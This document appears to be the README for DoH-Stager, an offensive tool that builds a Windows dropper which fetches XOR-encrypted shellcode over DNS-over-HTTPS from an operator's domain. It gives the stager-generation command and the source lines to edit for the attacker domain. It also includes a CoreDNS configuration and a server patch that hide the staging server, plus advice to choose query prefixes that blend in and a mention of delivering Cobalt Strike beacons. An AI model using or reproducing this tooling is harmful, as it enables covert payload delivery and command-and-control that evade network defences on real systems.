# DoH-Stager

DoH-Stager is an expansion of the awesome [DNSStager](https://github.com/mhaskar/DNSStager) tool made by [@mohammadaskar2](https://twitter.com/mohammadaskar2). DoH-Stager is aimed at providing the same functionalities as the original version, but using DNS-over-HTTPS instead of classic DNS. 

For those who are not familiar with DNSStager, the project is program what allows the operator to create a number of stagers that will fetch an arbitrary payload via DNS. Despite the PoC is intended to be used with a shellcode, it can adapted to retrieve any content such as encryption keys or other post-exploitation capabilities. 

This update was necessary in order to operate in environments where DNS resolution was restricted on the host and mostly delegated to the HTTP proxy.

## Usage

In order to use DoH-Stager you need to configure the following components:

- A custom NS record configured in your DNS provider that points to the host where the DNSStager server was deployed
- A fully functioning DNSStager deployment, as outlined [here](https://github.com/mhaskar/DNSStager#installation).

Run the `dnsstager`python script as follows:

```
./dnsstager.py  --domain p.pacc.tortellozzi.club --payload x64/c/ipv6 --o
utput ~/payload.exe --prefix emperor --sleep 1 --xorkey 0x10 --shellcode_path ~/calc-thread64.bin
```

The arguments:

- `--domain p.pacc.tortellozzi.club` is the domain that you want to use for DNSStager
- `--payload x64/c/ipv6`is the type of payload that you want to generate, do not change this.
- `--prefix emperor` the prexif to prepend to all the queries, find a suitable name that will blend in.
- `--xorkey 0x10`the key used to encrypt the shellcode/payload  
- `--shellcode_path ~/calc-thread64.bin` is the shellcode that you want to serve 

Take note of the `xorkey` parameter you use, as you will need to manually copy it in the `DoHStager.cpp` file later.

You can modify line 18 of the `DoHStager.cpp` file to use other DoH providers, the provided PoC only used Google's DNS:

```
 18 #define DOMAIN              "dns.google.com"
```

You will also need to modify line 189 to specify your custom domain:

```
189                 sprintf_s(domain, 200, "emperor%i.p.pacc.tortellozzi.club",     i);
```

the above should match with the values that you specified when the `dnsstager` server was launched.

Compile the project using Visual Studio (tested with VS2019) and enjoy your dropper! Of course it is missing several features, such as:

- Execution guardrails
- OpSec-safe process injection

But after all we want to keep a couple of aces in our sleeve and not provide a fully weaponised version available to the public.

In addition, if you do not want to expose your DNSStager server directly to the internet, and there are several reasons for not doing it, as outlined in F-Secure's blog [Detecting Exposed Cobalt Strike DNS Redirectors](https://labs.f-secure.com/blog/detecting-exposed-cobalt-strike-dns-redirectors), it is possible to use CoreDNS to provide an additional layer of obfuscation.

Using the proposed configuration it will be possible to have a DNS server that will forward DNS queries to all the domain via the Quad9 resolver, whilst forwarding the traffic to the DNSStager server only for the desired zone.

The Corefile that can be used is the following:

```
. {
log
  forward . 9.9.9.9
}

p.pacc.tortellozzi.club {
        log
        forward . 127.0.0.1:5050
}
```

And the only thing that was changed in the original server's python script was the port where the server will be listening to:
```
--- a/core/functions.py
+++ b/core/functions.py
@@ -185,8 +185,8 @@ def start_dns_server(ZONES):
     resolver = Resolver(ZONES)

     try:
-        server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
-        print_success("Server started!")
+        server = DNSServer(resolver, port=5050, address="0.0.0.0", tcp=False)
+        print_success("Server started on port 5050!")
         server.start()
```

## Other Notes

* This tool is not great in terms of performance. In fact, to download a fully stageless Cobalt Strike beacon might take approximately one hour wilst genertaing a lot of traffic. Use at your own risk.
